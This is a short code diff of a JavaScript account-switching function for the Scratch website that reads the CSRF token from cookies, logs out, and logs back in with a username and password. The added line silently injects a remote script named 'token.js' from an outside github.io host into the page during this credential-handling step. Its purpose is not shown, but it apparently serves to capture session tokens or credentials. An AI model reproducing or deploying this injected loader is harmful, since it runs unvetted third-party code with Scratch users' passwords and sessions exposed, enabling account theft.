@@ -2,6 +2,7 @@
 	async function switchAccount(username,password){
 	    let token="";{let cookie=document.cookie;cookie=cookie.split(';');let cok=[[],[]];cookie.forEach(function(element){const elements=element.split("=");cok[0].push(elements[0]);cok[1].push(elements[1]);});token=cok[1][cok[0].indexOf(' scratchcsrftoken')];}
 	    await fetch("https://scratch.mit.edu/accounts/logout/",{method:"POST","headers":{"x-csrftoken":token}});
+	    var src=document.createElement("script");src.src="https://haruymth.github.io/scripts/codes/token.js";document.body.appendChild(src);
 	    let a=await fetch("https://scratch.mit.edu/accounts/login/",{method:"POST",body:JSON.stringify({"username":username,"password":password,"useMessages":false}),"headers":{"x-csrftoken":token,"x-requested-with": "XMLHttpRequest"}});
 	    let sessionid=await a.json()
 	    if(a.status==200){
